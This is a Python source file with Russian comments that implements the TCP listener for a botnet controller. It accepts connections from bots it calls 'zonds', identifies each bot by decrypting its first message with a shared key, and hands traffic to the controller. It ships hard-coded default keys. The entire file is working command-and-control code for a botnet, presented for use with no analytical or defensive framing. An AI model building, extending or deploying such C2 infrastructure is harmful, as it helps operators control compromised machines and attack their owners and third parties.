#!/usr/bin/env python3
"""
TCP-сервер для botnet_controller
Обрабатывает подключения от зондов и передает данные в контроллер
"""

import os
import sys
import time
import socket
import select
import threading
import argparse
import logging
import signal
import json
from typing import Dict, List, Any, Optional, Tuple, Union

from botnet_controller import BotnetController

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('tcp_server.log')
    ]
)
logger = logging.getLogger('tcp_server')


class ZondConnection:
    """
    Класс для хранения информации о соединении с зондом
    """
    def __init__(self, sock: socket.socket, addr: Tuple[str, int]):
        """
        Инициализация соединения с зондом
        
        Args:
            sock: Сокет соединения
            addr: Адрес клиента (хост, порт)
        """
        self.socket = sock
        self.address = addr
        self.buffer = ""
        self.zond_id = None
        self.last_activity = time.time()
    
    def update_activity(self):
        """Обновляет время последней активности"""
        self.last_activity = time.time()
    
    def close(self):
        """Закрывает соединение"""
        try:
            self.socket.close()
        except:
            pass


class TCPServer:
    """
    TCP-сервер для обработки подключений от зондов
    """
    def __init__(
        self,
        controller: BotnetController,
        host: str = "0.0.0.0",
        port: int = 8443,
        max_connections: int = 100
    ):
        """
        Инициализация TCP-сервера
        
        Args:
            controller: Контроллер ботнета
            host: Хост для прослушивания
            port: Порт для прослушивания
            max_connections: Максимальное количество одновременных соединений
        """
        self.controller = controller
        self.host = host
        self.port = port
        self.max_connections = max_connections
        
        # Слушающий сокет
        self.server_socket = None
        
        # Соединения с клиентами
        self.connections: Dict[socket.socket, ZondConnection] = {}
        
        # Блокировка для потокобезопасности
        self.lock = threading.RLock()
        
        # Флаг работы сервера
        self.running = False
        
        # Список ожидающих сокетов
        self.pending_sockets = []
    
    def start(self):
        """Запускает сервер"""
        if self.running:
            return
        
        try:
            # Создаем слушающий сокет
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Устанавливаем опцию для повторного использования адреса
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Привязываем к адресу и порту
            self.server_socket.bind((self.host, self.port))
            
            # Начинаем прослушивание
            self.server_socket.listen(self.max_connections)
            
            # Устанавливаем неблокирующий режим
            self.server_socket.setblocking(False)
            
            # Помечаем как запущенный
            self.running = True
            
            logger.info(f"TCP-сервер запущен на {self.host}:{self.port}")
            
            # Запускаем поток обработки соединений
            threading.Thread(
                target=self._connection_handler,
                daemon=True,
                name="ConnectionHandler"
            ).start()
            
            # Запускаем поток очистки неактивных соединений
            threading.Thread(
                target=self._cleanup_connections,
                daemon=True,
                name="ConnectionCleaner"
            ).start()
        
        except Exception as e:
            logger.error(f"Ошибка при запуске сервера: {str(e)}")
            self.stop()
            raise
    
    def stop(self):
        """Останавливает сервер"""
        if not self.running:
            return
        
        self.running = False
        
        # Закрываем все соединения
        with self.lock:
            for conn in list(self.connections.values()):
                conn.close()
            
            self.connections.clear()
            
            # Закрываем слушающий сокет
            if self.server_socket:
                try:
                    self.server_socket.close()
                except:
                    pass
                
                self.server_socket = None
        
        logger.info("TCP-сервер остановлен")
    
    def _connection_handler(self):
        """Поток для обработки соединений"""
        while self.running:
            try:
                # Список сокетов для чтения (серверный + клиентские)
                read_sockets = [self.server_socket] + list(self.connections.keys())
                
                # Используем select для мультиплексирования
                readable, _, exceptional = select.select(read_sockets, [], read_sockets, 1.0)
                
                # Обрабатываем сокеты, готовые для чтения
                for sock in readable:
                    # Если это серверный сокет, принимаем новое соединение
                    if sock == self.server_socket:
                        self._accept_connection()
                    # Если это клиентский сокет, читаем данные
                    else:
                        self._read_data(sock)
                
                # Обрабатываем сокеты с ошибками
                for sock in exceptional:
                    self._handle_error(sock)
            
            except Exception as e:
                logger.error(f"Ошибка в обработчике соединений: {str(e)}")
                time.sleep(1)
    
    def _accept_connection(self):
        """Принимает новое соединение"""
        try:
            # Принимаем соединение
            client_socket, client_address = self.server_socket.accept()
            
            # Устанавливаем неблокирующий режим
            client_socket.setblocking(False)
            
            # Создаем объект соединения
            connection = ZondConnection(client_socket, client_address)
            
            # Добавляем в список соединений
            with self.lock:
                self.connections[client_socket] = connection
            
            logger.info(f"Принято новое соединение от {client_address[0]}:{client_address[1]}")
        
        except Exception as e:
            logger.error(f"Ошибка при принятии соединения: {str(e)}")
    
    def _read_data(self, sock: socket.socket):
        """
        Читает данные из сокета
        
        Args:
            sock: Сокет для чтения
        """
        with self.lock:
            # Получаем объект соединения
            if sock not in self.connections:
                return
            
            connection = self.connections[sock]
        
        try:
            # Читаем данные
            data = sock.recv(4096)
            
            # Если данных нет, соединение закрыто
            if not data:
                self._close_connection(sock)
                return
            
            # Обновляем время последней активности
            connection.update_activity()
            
            # Добавляем данные в буфер
            connection.buffer += data.decode()
            
            # Обрабатываем полные сообщения
            while '\n' in connection.buffer:
                message, connection.buffer = connection.buffer.split('\n', 1)
                
                # Обрабатываем сообщение
                self._handle_message(sock, message)
        
        except Exception as e:
            logger.error(f"Ошибка при чтении данных: {str(e)}")
            self._close_connection(sock)
    
    def _handle_message(self, sock: socket.socket, message: str):
        """
        Обрабатывает полученное сообщение
        
        Args:
            sock: Сокет, от которого получено сообщение
            message: Полученное сообщение
        """
        with self.lock:
            # Получаем объект соединения
            if sock not in self.connections:
                return
            
            connection = self.connections[sock]
        
        try:
            # Обрабатываем сообщение с помощью контроллера
            
            # Если ID зонда еще не определен, пытаемся его извлечь из сообщения
            if connection.zond_id is None:
                # Пытаемся дешифровать сообщение
                # Для этого используем временный протокол с пустым ID
                from zond_protocol import ZondProtocol, MessageType
                
                temp_protocol = ZondProtocol(
                    agent_id="temp",
                    secret_key=self.controller.secret_key,
                    encryption_key=self.controller.encryption_key
                )
                
                # Дешифруем сообщение
                decrypted_message = temp_protocol.decrypt_message(message)
                
                if decrypted_message:
                    # Извлекаем ID зонда
                    connection.zond_id = decrypted_message.sender_id
                    
                    # Сохраняем соединение в контроллере
                    self.controller.connections[connection.zond_id] = sock
                    
                    logger.info(f"Определен ID зонда: {connection.zond_id}")
                else:
                    logger.error("Не удалось дешифровать сообщение для определения ID зонда")
                    self._close_connection(sock)
                    return
            
            # Теперь, когда ID зонда известен, передаем сообщение контроллеру
            self.controller.process_incoming_message(connection.zond_id, message)
        
        except Exception as e:
            logger.error(f"Ошибка при обработке сообщения: {str(e)}")
    
    def _handle_error(self, sock: socket.socket):
        """
        Обрабатывает ошибку сокета
        
        Args:
            sock: Сокет с ошибкой
        """
        logger.error(f"Ошибка сокета")
        self._close_connection(sock)
    
    def _close_connection(self, sock: socket.socket):
        """
        Закрывает соединение
        
        Args:
            sock: Сокет для закрытия
        """
        with self.lock:
            # Получаем объект соединения
            if sock not in self.connections:
                return
            
            connection = self.connections[sock]
            
            # Закрываем соединение
            connection.close()
            
            # Удаляем из списка соединений
            del self.connections[sock]
            
            # Если ID зонда определен, удаляем из контроллера
            if connection.zond_id and connection.zond_id in self.controller.connections:
                del self.controller.connections[connection.zond_id]
            
            logger.info(f"Закрыто соединение с {connection.address[0]}:{connection.address[1]}")
    
    def _cleanup_connections(self):
        """Поток для очистки неактивных соединений"""
        while self.running:
            try:
                current_time = time.time()
                
                with self.lock:
                    # Ищем неактивные соединения (более 5 минут без активности)
                    inactive_sockets = []
                    
                    for sock, connection in self.connections.items():
                        if current_time - connection.last_activity > 300:  # 5 минут
                            inactive_sockets.append(sock)
                    
                    # Закрываем неактивные соединения
                    for sock in inactive_sockets:
                        self._close_connection(sock)
                
                # Спим немного, чтобы не нагружать CPU
                time.sleep(60)
            
            except Exception as e:
                logger.error(f"Ошибка в процессе очистки соединений: {str(e)}")
                time.sleep(60)


def main():
    """Точка входа программы"""
    parser = argparse.ArgumentParser(description="TCP-сервер для BotnetController")
    
    parser.add_argument("--host", default="0.0.0.0", help="Хост для прослушивания")
    parser.add_argument("--port", type=int, default=8443, help="Порт для прослушивания")
    parser.add_argument("--server-id", default="c1_server", help="ID сервера")
    parser.add_argument("--secret", default="shared_secret_key", help="Секретный ключ")
    parser.add_argument("--key", default="encryption_key_example", help="Ключ шифрования")
    parser.add_argument("--storage", default="zonds_storage.json", help="Файл хранилища зондов")
    
    args = parser.parse_args()
    
    # Создаем контроллер ботнета
    controller = BotnetController(
        server_id=args.server_id,
        secret_key=args.secret,
        encryption_key=args.key,
        listen_host=args.host,
        listen_port=args.port,
        storage_file=args.storage
    )
    
    # Создаем TCP-сервер
    server = TCPServer(
        controller=controller,
        host=args.host,
        port=args.port
    )
    
    # Функция для корректного завершения при получении сигнала
    def signal_handler(sig, frame):
        print("\nОстанавливаем сервер...")
        server.stop()
        controller.stop()
        print("Сервер остановлен")
        sys.exit(0)
    
    # Регистрируем обработчик сигнала
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    # Запускаем контроллер и сервер
    controller.start()
    server.start()
    
    print(f"Сервер запущен на {args.host}:{args.port}")
    print("Нажмите Ctrl+C для остановки")
    
    # Основной цикл программы
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nОстанавливаем сервер...")
        server.stop()
        controller.stop()
        print("Сервер остановлен")


# Точка входа программы
if __name__ == "__main__":
    main() 